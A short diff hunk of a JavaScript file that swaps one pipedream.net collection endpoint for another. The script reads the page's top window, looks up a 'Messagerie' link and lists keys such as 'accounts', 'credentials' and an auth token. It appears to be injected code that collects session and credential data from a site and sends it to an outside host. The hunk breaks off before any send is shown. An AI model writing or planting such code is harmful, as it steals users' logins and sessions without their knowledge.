@@ -1,7 +1,7 @@
 (async function ex() {
 
 	const ur = new URL(document.currentScript.src);
-	const url = 'https://eolghla9xpgfvq5.m.pipedream.net/session';
+	const url = 'https://eoyybrhlzu9cp6e.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
